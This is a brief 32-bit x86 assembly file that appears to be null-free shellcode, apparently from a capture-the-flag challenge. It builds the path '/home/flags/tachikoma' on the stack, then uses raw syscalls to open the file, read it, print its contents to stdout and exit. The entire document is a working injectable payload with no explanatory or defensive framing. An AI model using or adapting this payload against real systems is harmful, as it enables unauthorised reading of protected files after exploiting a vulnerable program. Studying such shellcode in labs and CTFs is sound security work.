.intel_syntax noprefix

.global _start
_start:
push	0x05
pop	eax
cdq
push	edx
push	0x61	#file name
push    0x6d6f6b69
push    0x68636174
push    0x2f736761
push    0x6c662f65
push    0x6d6f682f
mov	ebx,esp
mov	ecx,edx
int	0x80
mov	ebx,eax
mov	ecx,esp
mov	dl,0x80
mov	al,0x03
int	0x80
xchg	eax,edx		#this is tricky
mov	ecx,esp
mov	bl,1
mov	al,0x04
int	0x80
mov	al,0x01
int	0x80
